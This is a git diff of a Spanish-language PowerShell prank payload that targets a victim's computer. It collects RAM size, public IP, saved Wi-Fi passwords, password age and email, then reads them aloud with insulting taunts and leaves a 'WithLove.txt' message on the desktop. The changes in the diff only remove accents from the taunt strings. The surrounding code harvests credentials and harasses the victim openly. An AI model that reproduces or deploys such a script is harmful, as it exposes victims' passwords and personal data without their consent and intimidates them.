@@ -85,13 +85,13 @@ function Get-RAM {
 
 # ENTER YOUR CUSTOM RESPONSES HERE
 #----------------------------------------------------------------------------------------------------
-    $lowRAM = "$RAM gigas de ram? también podría usar lápiz y papel"
+    $lowRAM = "$RAM gigas de ram? también podria usar lapiz y papel"
     
-    $okRAM = "$RAM gigas de ram de verdad? Tengo una calculadora con más poder de cómputo."
+    $okRAM = "$RAM gigas de ram de verdad? Tengo una calculadora con mas poder de computo."
     
     $goodRAM = "$RAM gigas de ram? Casi puedo garantizar que tienes un teclado iluminado... quieres ser streamer, ¿eh?"
 
-    $impressiveRAM = "$RAM gigas de ram? ¿Hablas en serio? una súper computadora sin seguridad que es divertida allí mismo"
+    $impressiveRAM = "$RAM gigas de ram? ¿Hablas en serio? una super computadora sin seguridad que es divertida alli mismo"
 #----------------------------------------------------------------------------------------------------
 
     if($RAM -le 4){
@@ -144,7 +144,7 @@ function Get-PubIP {
     -ErrorAction SilentlyContinue
     }
 
-    return "su dirección IP pública es $computerPubIP"
+    return "su direccion IP publica es $computerPubIP"
 }
 
 # echo statement used to track progress while debugging
@@ -196,11 +196,11 @@ function Get-Pass {
 
 # ENTER YOUR CUSTOM RESPONSES HERE
 #----------------------------------------------------------------------------------------------------
-    $badPASS = "$pro no es un nombre muy creativo pero al menos no es tan malo como la contraseña de tu wifi... ¿Solo $pwl caracteres para la contraseña? $pass ...? en serio..? ¿ $pass Fue la mejor que se te ocurrió?"
+    $badPASS = "$pro no es un nombre muy creativo pero al menos no es tan malo como la contraseña de tu wifi... ¿Solo $pwl caracteres para la contrasena? $pass ...? en serio..? ¿ $pass Fue la mejor que se te ocurrio?"
     
-    $okPASS = "$pro no es un nombre muy creativo pero al menos lo estas intentando un poco, tu contraseña es $pwl caracteres de longitud, aunque sigue siendo basura.. ¿ $pass ...? Puedes hacerlo mejor"
+    $okPASS = "$pro no es un nombre muy creativo pero al menos lo estas intentando un poco, tu contrasena es $pwl caracteres de longitud, aunque sigue siendo basura.. ¿ $pass ...? Puedes hacerlo mejor"
     
-    $goodPASS = "$pro no es un nombre muy creativo pero al menos no eres un completo tonto... $pwlla contraseña de caracteres largos en realidad no es mala, pero no te salvó de mí, ¿verdad? ¡no, no lo hizo! $pass aunque es una contraseña decente."
+    $goodPASS = "$pro no es un nombre muy creativo pero al menos no eres un completo tonto... $pwlla contrasena de caracteres largos en realidad no es mala, pero no te salvo de mi, ¿verdad? ¡no, no lo hizo! $pass aunque es una contrasena decente."
 #----------------------------------------------------------------------------------------------------
 
     if($pass.length -lt 8) { return $badPASS
@@ -376,7 +376,7 @@ if (!$Networks) { Write-Host "variable is null"
 
 # this is the message that will be coded into the image you use as the wallpaper
 
-	$hiddenMessage = "`n`nMi crimen es la curiosidad `ny si la curiosidad mato al gato `npero la satisfacción lo trajo de vuelta `n con amor -Jakoby"
+	$hiddenMessage = "`n`nMi crimen es la curiosidad `ny si la curiosidad mato al gato `npero la satisfaccion lo trajo de vuelta `n con amor -Jakoby"
 
 # this will be the name of the image you use as the wallpaper
 
@@ -475,11 +475,11 @@ echo "All Wifi Passes Done"
 
 # ENTER YOUR CUSTOM RESPONSES HERE 
 #---------------------------------------------------------------------------------------------------- 
-    $newPass = "$pls fue la última vez que cambiaste tu contraseña... Cambiaste tu contraseña $days hace dias... tengo que aplaudirte... al menos cambias tu contraseña seguido. Todavía no me detuvo! "
+    $newPass = "$pls fue la ultima vez que cambiaste tu contrasena... Cambiaste tu contraseña $days hace dias... tengo que aplaudirte... al menos cambias tu contrasena seguido. Todavia no me detuvo! "
     
-    $avgPASS = "$pls fue la última vez que cambiaste tu contraseña... ha sido $days días desde que cambiaste tu contraseña, realmente comenzaste a presionarla, quiero decir, mira, estoy aquí. eso te dice algo" 
+    $avgPASS = "$pls fue la ultima vez que cambiaste tu contrasena... ha sido $days dias desde que cambiaste tu contrasena, realmente comenzaste a presionarla, quiero decir, mira, estoy aqui. eso te dice algo" 
     
-    $oldPASS = "$pls fue la última vez que cambiaste tu contraseña... ha sido $days días desde que cambiaste tu contraseña, básicamente me estabas rogando que te hackeara, bueno, ¡aquí estoy! "
+    $oldPASS = "$pls fue la ultima vez que cambiaste tu contrasena... ha sido $days dias desde que cambiaste tu contrasena, basicamente me estabas rogando que te hackeara, bueno, ¡aqui estoy! "
 #----------------------------------------------------------------------------------------------------      
     
     if($days -lt 45) { return $newPass
@@ -519,16 +519,16 @@ function Get-email {
 
     # Write Error is just for troubleshooting
     catch {Write-Error "An email was not found" 
-    return "tienes suerte de no tener tu correo electrónico conectado a tu cuenta, realmente me habría divertido contigo entonces lol"
+    return "tienes suerte de no tener tu correo electronico conectado a tu cuenta, realmente me habria divertido contigo entonces lol"
     -ErrorAction SilentlyContinue
     }
         
 # ENTER YOUR CUSTOM RESPONSES HERE
 #----------------------------------------------------------------------------------------------------
-    $gmailResponse = "Al menos usas G Mail... deberíamos ser amigos. Si estás inactivo, solo envíame un correo electrónico, te enviaré un mensaje a $email . ¿ese es tu correo no?"
-    $yahooResponse = "¿una cuenta de yahoo en serio? o tienes 50 años o acabas de terminar de hacer algo de tiempo, mucho de eso..$email ... esto es muy triste"
-    $hotmailResponse = "¿De Verdad?. tienes una cuenta de hotmail? $email ... Estoy enviando esto a la Policia Nacional. Necesitan revisar tu disco duro."
-    $otherEmailResponse = "Que cojones no sé ni lo que es esto .. $email ..espero que no hayas pensado que era seguro"
+    $gmailResponse = "Al menos usas G Mail... deberiamos ser amigos. Si estas inactivo, solo envíame un correo electronico, te enviare un mensaje a $email . ¿ese es tu correo no?"
+    $yahooResponse = "¿una cuenta de yahoo en serio? o tienes 50 anos o acabas de terminar de hacer algo de tiempo, mucho de eso..$email ... esto es muy triste"
+    $hotmailResponse = "¿De Verdad? ¿tienes una cuenta de hotmail? $email ... Estoy enviando esto a la Policia Nacional. Necesitan revisar tu disco duro."
+    $otherEmailResponse = "Que cojones no se ni lo que es esto .. $email ..espero que no hayas pensado que era seguro"
 #----------------------------------------------------------------------------------------------------
 
     if($email -like '*gmail*') { return $gmailResponse
@@ -566,7 +566,7 @@ $LAST_PASSwarn =  Get-Days_Set
 
 $EMAILwarn = Get-email 
 
-$OUTRO =  "Mi crimen es el de la curiosidad....    y sí la curiosidad mató al gato....    pero la satisfacción lo trajo de vuelta....    luego $fullName"
+$OUTRO =  "Mi crimen es el de la curiosidad....    y sí la curiosidad mato al gato....    pero la satisfaccion lo trajo de vuelta....    luego $fullName"
 
 # echo statement used to track progress while debugging
 echo "Speak Variables set"
@@ -662,7 +662,7 @@ $s.Speak($OUTRO)
 
 # this snippet will leave a message on your targets desktop 
 
-$message = "`n`nMi crimen es la curiosidad `ny si la curiosidad mato al gato `npero la satisfacción lo trajo de vuelta `n con amor -Jakoby"
+$message = "`n`nMi crimen es la curiosidad `ny si la curiosidad mato al gato `npero la satisfaccion lo trajo de vuelta `n con amor -Jakoby"
 
 Add-Content $home\Desktop\WithLove.txt $message
 ###########################################################################################################
